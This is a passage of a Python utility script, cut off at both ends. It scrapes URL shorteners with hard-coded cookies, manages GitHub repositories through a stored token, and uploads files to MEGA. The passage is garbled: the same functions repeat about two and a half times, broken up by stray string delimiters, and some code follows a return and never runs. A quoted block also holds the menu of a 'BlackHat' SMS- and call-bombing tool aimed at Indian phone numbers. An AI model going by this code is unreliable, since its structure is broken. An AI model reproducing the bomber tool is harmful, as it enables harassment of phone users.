        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        print('\n')
        FrontentTypingFunction('└─[ ✔ ] Success')
        FrontentTypingFunction(f"└─[ ✔ ] Link : "+Fore.GREEN+f"{value}")
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')

def upload_file_to_github(access_token, repo_owner, repo_name, local_file_path, branch_name, commit_message):
    # Base URL for the GitHub API
    base_url = "https://api.github.com"

    # Set up headers with authentication
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Read the file content and encode it to Base64
    with open(local_file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode()

    # API endpoint to create or update a file
    file_url = f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{local_file_path}"

    # Prepare the payload
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": branch_name,
    }

    # Send the request to create/update the file
    response = requests.put(file_url, headers=headers, json=payload)

    
   

    if response.status_code == 201:
        pass
        #print(f"Uploaded : {response.status_code}")
        #print(response.json())
    else:
        print('Failed !!')

def upload_files_to_github(username, repository, file_list, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    for file_info in file_list:
        file_path = file_info["file_path"]
        file_content = file_info["file_content"]
        commit_message = f"Upload {file_path}"
        branch_name = "main"  # Replace with the desired branch name if not using 'main'
        
        url = f"{base_url}{file_path}"
        
        # Encode the file content in Base64
        file_content_base64 = base64.b64encode(file_content.encode()).decode()
        
        payload = {
            "message": commit_message,
            "content": file_content_base64,
            "branch": branch_name
        }
        
        response = requests.put(url, headers=headers, json=payload)

        
        
        
        if response.status_code == 201 or response.status_code == 200:
            FrontentTypingInputCode(f"File '{file_path}' uploaded successfully." , 'x')
        else:
            print(f"Failed to upload file '{file_path}'. Status Code: {response.status_code}")
            backie()
        
        

def bhaichange(answer):
    if answer == 'y' or answer=='Y':
        with open('.githubapi.txt','r') as githubfolderwala:
            datafolderwala = githubfolderwala.read().strip()
        with open('.githubapi2.txt','r') as github2wala:
            data2wala = github2wala.read().strip()
        github_username = f"{data2wala}".strip()
        githubinfowala = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Repository Name :  "+r).strip()
        repository_name = f"{githubinfowala}".strip()
        github_token = f"{datafolderwala}".strip()
        meisahab = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Folder name :  "+r).strip()
        os.chdir(meisahab)
        time.sleep(1.0)
        shakar = Main_Setup()
        shakar.oneshotkill()
        FrontentTypingFunction('Uploading files from folder {}'.format(meisahab))
        print('\n')
        for k in os.listdir():
            if Path(f'{k}').is_dir():
                continue
            with open(f'{k}','r') as nicetxt:
                alldata = nicetxt.read()
            file_list = [
                    {
                        "file_path": f"{k}",
                        "file_content": f"{alldata}"
                    },
                ]

            upload_files_to_github(github_username, repository_name, file_list, github_token)
        print('\n')
        FrontentTypingInputCode('All Files Uploaded Successfully From folder {}'.format(meisahab),'x')
        print('\n')
        backie()

def delete_github_repository(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.delete(base_url, headers=headers)
    
    if response.status_code == 204:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' deleted successfully.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to delete repository. Status Code: {response.status_code}")
        print(response.json())
        exit()

def make_repository_private(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "private": True
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' set to private.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to set repository to private. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_repository_description(username, repository, description, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "description": description
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository description updated successfully.")
    elif response.status_code == 404:
        print(f"Repository not found.")
    else:
        print(f"Failed to update repository description. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_readme_in_repository(username, repository, new_readme_content, commit_message, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/README.md"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Get the current README content
    response = requests.get(base_url, headers=headers)
    response_json = response.json()
    current_readme_content = b64encode(response_json['content'].encode()).decode()
    
    # Update the content if it's different
    if current_readme_content != b64encode(new_readme_content.encode()).decode():
        payload = {
            "message": commit_message,
            "content": b64encode(new_readme_content.encode()).decode(),
            "sha": response_json['sha']
        }
        update_response = requests.put(base_url, headers=headers, json=payload)
        if update_response.status_code == 200:
            print('\n')
            FrontentTypingFunction("README updated successfully.")
        else:
            print(f"Failed to update README. Status Code: {update_response.status_code}")
            print(update_response.json())
            exit()
    else:
        print("No changes detected in README.")
        print('\n')
        backie()

def shorturllop(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)

    response = requests.post('https://cutt.ly/scripts/shortenUrl.php', cookies=cookies, headers=headers, data=data)

    content = response.content

    with open('last.txt','w') as oi:
        oi.write(str(content))

    with open('last.txt','r') as lj:
        data5 = lj.read()

    yy = data5.split("'")
    return yy[1]
    
    os.remove('last.txt')
    os.remove('samaybhai.txt')

def upload_multiple_to_mega(email, password, files):
    mega = Mega()
    m = mega.login(email, password)
    
    for file_path in files:
        m.upload(file_path)
        FrontentTypingFunction(f"Uploaded: {file_path}")

def mainsystemlink():
    money = Main_Setup()
    money.oneshotkill()
    with open('.mega.txt','r') as megaread:
        megareads = megaread.readlines()

    emptybhai = {}

    for i in megareads:
        jsplit = i.split('\t')
        emptybhai[jsplit[0]] = jsplit[1]

    emptybhai = { x.translate({32:None}) : y
        for x, y in emptybhai.items()}


    mega_email = f"{emptybhai.get('Username')}".strip()
    mega_password = f"{emptybhai.get('Password')}".strip()

    with open('.savenamed.txt','r') as files:
        oksdata = files.readlines()

    # Log in to MEGA
    mega = Mega()
    m = mega.login(mega_email, mega_password)
  

    op = 0
    samay = []

    for line in oksdata:
        samay.append(line.strip())

    filesdirnew = os.path.expanduser('~') + '/'

    newfilenames = []
    osp = 1
    for k in samay:
        Klops = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the Related name file {osp} : "+r).strip()
        newfilenames.append(Klops)
        osp = osp + 1


    money.oneshotkill()


    # Upload the file and get its handle

    for i in samay:
        file_handle = m.upload(samay[op])
        
        

        # Get the public download link
        download_link = m.get_upload_link(file_handle)

        with open(f'{filesdirnew}.bash_mega.txt','a') as filesnewcontent:
                
                filesnewcontent.write(f'{newfilenames[op]} 	 {download_link}\n')
        

        print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m link -> "+Fore.RED+f"{samay[op]}: "+Fore.GREEN+str(shorturllop(download_link)))

        op = op + 1
        
    
     
    os.remove('.savenamed.txt')
    print('\n')
    backie()
    


def shorturl(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)


'''
# -------- banner

def banner():
    b1="\033[1;32m"
    g=r
    w1=b
    print(w1+"/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\//")
    print("\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/")
    print("/\/\                                                      /\/\\")
    print("\/\/"+b1+"  <Program>"+g+"       Sms-Bombv2.5     "+b1+" </Program>"+w1+"        \/\/")
    print("/\/\  "+b1+"        </>  "+g+"Team Sincryption !!! "+b1+"</>"+w1+"               /\/\\")
    print("\/\/                                                      \/\/")
    print("/\/\  "+b1+"<Developer>  "+g+"      Zork           "+b1+"</Developer>"+w1+"      /\/\\")
    print("\/\/  "+b1+"<Github>  "+g+"https://tinyurl.com/prosamay7"+b1+"  </Github>"+w1+"  \/\/") 
    print("/\/\                                                      /\/\\")
    print("\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/")
    print("/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\\")
    print('\n')

def Type(data):
    print(gg+"└─> "+w+"\033[1;37m"+data)


def backslash():
    print('\n')


def screenclear():
    _ = os.system('cls' if os.name=='nt' else 'clear')


def AlwaysBanner():
    screenclear()
    banner()


def Option_Front_Done():
    AlwaysBanner()
    Type(r+"[ "+b+"1"+r+" ]"+w+"\033[1;37m BlackHat "+Fore.LIGHTRED_EX+"||"+Fore.WHITE+" Sms-Bomb v2.5")
    Type(r+"[ "+b+"2"+r+" ]"+w+"\033[1;37m BlackHat "+Fore.LIGHTRED_EX+"||"+Fore.WHITE+" Custom-Sms v2.5")
    Type(r+"[ "+b+"3"+r+" ]"+w+"\033[1;37m BlackHat "+Fore.LIGHTRED_EX+"||"+Fore.WHITE+" Call-Bomb v2.5")
    Type(r+"[ "+b+"4"+r+" ]"+w+"\033[1;37m BlackHat "+Fore.LIGHTRED_EX+"||"+Fore.WHITE+" Update")
    Type(r+"[ "+b+"5"+r+" ]"+w+"\033[1;37m BlackHat "+Fore.LIGHTRED_EX+"||"+Fore.WHITE+" Exit")
    backslash()

def Number10DigitError():
    filebypass = True
    TeamSincryption = Samay(filebypass)
    AlwaysBanner()
    Type('Indian Number Contains 10 Digit Number Please Recheck the Number and Try Again ....')
    Type('Restarting the Script Wait ......')
    backslash()
    time.sleep(2.5)
    TeamSincryption.Return_restart()

Option_Front_Done()


users_data = int(input(r+"└─"+w+"\033[1;37m Enter the Desire Options : "+r).strip())





'''

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        return value
       
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')


def shorturlsnew(link):
    cookies = {
    '_ga': 'GA1.2.1841157735.1660546435',
    '_gid': 'GA1.2.1926940915.1660546435',
    '_gat_gtag_UA_31391210_44': '1',
    }

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        print('\n')
        FrontentTypingFunction('└─[ ✔ ] Success')
        FrontentTypingFunction(f"└─[ ✔ ] Link : "+Fore.GREEN+f"{value}")
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')

def upload_file_to_github(access_token, repo_owner, repo_name, local_file_path, branch_name, commit_message):
    # Base URL for the GitHub API
    base_url = "https://api.github.com"

    # Set up headers with authentication
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Read the file content and encode it to Base64
    with open(local_file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode()

    # API endpoint to create or update a file
    file_url = f"{base_url}/repos/{repo_owner}/{repo_name}/contents/{local_file_path}"

    # Prepare the payload
    payload = {
        "message": commit_message,
        "content": encoded_content,
        "branch": branch_name,
    }

    # Send the request to create/update the file
    response = requests.put(file_url, headers=headers, json=payload)

    
   

    if response.status_code == 201:
        pass
        #print(f"Uploaded : {response.status_code}")
        #print(response.json())
    else:
        print('Failed !!')

def upload_files_to_github(username, repository, file_list, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    for file_info in file_list:
        file_path = file_info["file_path"]
        file_content = file_info["file_content"]
        commit_message = f"Upload {file_path}"
        branch_name = "main"  # Replace with the desired branch name if not using 'main'
        
        url = f"{base_url}{file_path}"
        
        # Encode the file content in Base64
        file_content_base64 = base64.b64encode(file_content.encode()).decode()
        
        payload = {
            "message": commit_message,
            "content": file_content_base64,
            "branch": branch_name
        }
        
        response = requests.put(url, headers=headers, json=payload)

        
        
        
        if response.status_code == 201 or response.status_code == 200:
            FrontentTypingInputCode(f"File '{file_path}' uploaded successfully." , 'x')
        else:
            print(f"Failed to upload file '{file_path}'. Status Code: {response.status_code}")
            backie()
        
        

def bhaichange(answer):
    if answer == 'y' or answer=='Y':
        with open('.githubapi.txt','r') as githubfolderwala:
            datafolderwala = githubfolderwala.read().strip()
        with open('.githubapi2.txt','r') as github2wala:
            data2wala = github2wala.read().strip()
        github_username = f"{data2wala}".strip()
        githubinfowala = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Repository Name :  "+r).strip()
        repository_name = f"{githubinfowala}".strip()
        github_token = f"{datafolderwala}".strip()
        meisahab = input(r+"[ "+b+"x"+r+" ]"+w+"\033[1;37m Enter Folder name :  "+r).strip()
        os.chdir(meisahab)
        time.sleep(1.0)
        shakar = Main_Setup()
        shakar.oneshotkill()
        FrontentTypingFunction('Uploading files from folder {}'.format(meisahab))
        print('\n')
        for k in os.listdir():
            if Path(f'{k}').is_dir():
                continue
            with open(f'{k}','r') as nicetxt:
                alldata = nicetxt.read()
            file_list = [
                    {
                        "file_path": f"{k}",
                        "file_content": f"{alldata}"
                    },
                ]

            upload_files_to_github(github_username, repository_name, file_list, github_token)
        print('\n')
        FrontentTypingInputCode('All Files Uploaded Successfully From folder {}'.format(meisahab),'x')
        print('\n')
        backie()

def delete_github_repository(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.delete(base_url, headers=headers)
    
    if response.status_code == 204:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' deleted successfully.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to delete repository. Status Code: {response.status_code}")
        print(response.json())
        exit()

def make_repository_private(username, repository, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "private": True
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository '{repository}' set to private.")
    elif response.status_code == 404:
        print(f"Repository '{repository}' not found.")
    else:
        print(f"Failed to set repository to private. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_repository_description(username, repository, description, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    payload = {
        "description": description
    }
    
    response = requests.patch(base_url, headers=headers, json=payload)
    
    if response.status_code == 200:
        print('\n')
        FrontentTypingFunction(f"Repository description updated successfully.")
    elif response.status_code == 404:
        print(f"Repository not found.")
    else:
        print(f"Failed to update repository description. Status Code: {response.status_code}")
        print(response.json())
        exit()

def update_readme_in_repository(username, repository, new_readme_content, commit_message, token):
    base_url = f"https://api.github.com/repos/{username}/{repository}/contents/README.md"
    
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    # Get the current README content
    response = requests.get(base_url, headers=headers)
    response_json = response.json()
    current_readme_content = b64encode(response_json['content'].encode()).decode()
    
    # Update the content if it's different
    if current_readme_content != b64encode(new_readme_content.encode()).decode():
        payload = {
            "message": commit_message,
            "content": b64encode(new_readme_content.encode()).decode(),
            "sha": response_json['sha']
        }
        update_response = requests.put(base_url, headers=headers, json=payload)
        if update_response.status_code == 200:
            print('\n')
            FrontentTypingFunction("README updated successfully.")
        else:
            print(f"Failed to update README. Status Code: {update_response.status_code}")
            print(update_response.json())
            exit()
    else:
        print("No changes detected in README.")
        print('\n')
        backie()

def shorturllop(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)

    response = requests.post('https://cutt.ly/scripts/shortenUrl.php', cookies=cookies, headers=headers, data=data)

    content = response.content

    with open('last.txt','w') as oi:
        oi.write(str(content))

    with open('last.txt','r') as lj:
        data5 = lj.read()

    yy = data5.split("'")
    return yy[1]
    
    os.remove('last.txt')
    os.remove('samaybhai.txt')

def upload_multiple_to_mega(email, password, files):
    mega = Mega()
    m = mega.login(email, password)
    
    for file_path in files:
        m.upload(file_path)
        FrontentTypingFunction(f"Uploaded: {file_path}")

def mainsystemlink():
    money = Main_Setup()
    money.oneshotkill()
    with open('.mega.txt','r') as megaread:
        megareads = megaread.readlines()

    emptybhai = {}

    for i in megareads:
        jsplit = i.split('\t')
        emptybhai[jsplit[0]] = jsplit[1]

    emptybhai = { x.translate({32:None}) : y
        for x, y in emptybhai.items()}


    mega_email = f"{emptybhai.get('Username')}".strip()
    mega_password = f"{emptybhai.get('Password')}".strip()

    with open('.savenamed.txt','r') as files:
        oksdata = files.readlines()

    # Log in to MEGA
    mega = Mega()
    m = mega.login(mega_email, mega_password)
  

    op = 0
    samay = []

    for line in oksdata:
        samay.append(line.strip())

    filesdirnew = os.path.expanduser('~') + '/'

    newfilenames = []
    osp = 1
    for k in samay:
        Klops = input(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m Enter the Related name file {osp} : "+r).strip()
        newfilenames.append(Klops)
        osp = osp + 1


    money.oneshotkill()


    # Upload the file and get its handle

    for i in samay:
        file_handle = m.upload(samay[op])
        
        

        # Get the public download link
        download_link = m.get_upload_link(file_handle)

        with open(f'{filesdirnew}.bash_mega.txt','a') as filesnewcontent:
                
                filesnewcontent.write(f'{newfilenames[op]} 	 {download_link}\n')
        

        print(r+"[ "+b+"x"+r+" ]"+w+f"\033[1;37m link -> "+Fore.RED+f"{samay[op]}: "+Fore.GREEN+str(shorturllop(download_link)))

        op = op + 1
        
    
     
    os.remove('.savenamed.txt')
    print('\n')
    backie()
    


def shorturl(link):
    #

    url = 'https://cutt.ly'

    r = requests.get(url).cookies

    with open('samaybhai.txt','w') as file:
        file.write(str(r))

    with open('samaybhai.txt','r') as ops:
        data = str(ops.read())

    opens = data.split()[1]
    data2 = opens.split('=')[1] # PSSID = 


    cookies = {
        'PHPSESSID': f'{data2}',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'multipart/form-data; boundary=---------------------------2436192811155685909485806476',
        'Origin': 'https://cutt.ly',
        'DNT': '1',
        'Alt-Used': 'cutt.ly',
        'Connection': 'keep-alive',
        'Referer': 'https://cutt.ly/',
        # 'Cookie': 'PHPSESSID=cs8i8m0ios0ld9redva40m1qdm',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    data = '-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="url"\r\n\r\n<url>\r\n-----------------------------2436192811155685909485806476\r\nContent-Disposition: form-data; name="domain"\r\n\r\n0\r\n-----------------------------2436192811155685909485806476--\r\n'
    

    data = data.replace('<url>',link)


'''
'''

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        return value
       
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')


def shorturlsnew(link):
    cookies = {
    '_ga': 'GA1.2.1841157735.1660546435',
    '_gid': 'GA1.2.1926940915.1660546435',
    '_gat_gtag_UA_31391210_44': '1',
    }

    headers = {
        'authority': 'www.shorturl.at',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-IN,en;q=0.9',
        'cache-control': 'max-age=0',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1841157735.1660546435; _gid=GA1.2.1926940915.1660546435; _gat_gtag_UA_31391210_44=1',
        'dnt': '1',
        'origin': 'https://www.shorturl.at',
        'referer': 'https://www.shorturl.at/',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.188 Safari/537.36 CrKey/1.54.250320',
    }

    data = {
        'u': f'{link}',
    }
    

    response = requests.post('https://www.shorturl.at/shortener.php', cookies=cookies, headers=headers, data=data)
    cds = response.content

    #with open('index.html','w') as files:
    #   files.write(str(cds))

    soup = BeautifulSoup(cds,'html.parser')

    try:
        value = soup.find('input', {'id': 'shortenurl'}).get('value')
        print('\n')
        FrontentTypingFunction('└─[ ✔ ] Success')
        FrontentTypingFunction(f"└─[ ✔ ] Link : "+Fore.GREEN+f"{value}")
        
      
        #os.remove('tinyurls.txt')
        #os.remove('linkstiny.txt')
    
        
    except Exception as e:
        print('\n')
        FrontentTypingFunction('Url is invalid !')
        print('\n')

def upload_file_to_github(access_token, repo_owner, repo_name, local_file_path, branch_name, commit_message):
    # Base URL for the GitHub API
    base_url = "https://api.github.com"

    # Set up headers with authentication
    headers = {
        "Authorization": f"token {access_token}"
    }

    # Read the file content and encode it to Base64
    with open(local_file_path, "rb") as file:
        content = file.read()
        encoded_content = base64.b64encode(content).decode()

    # API endpoint to create or update a file
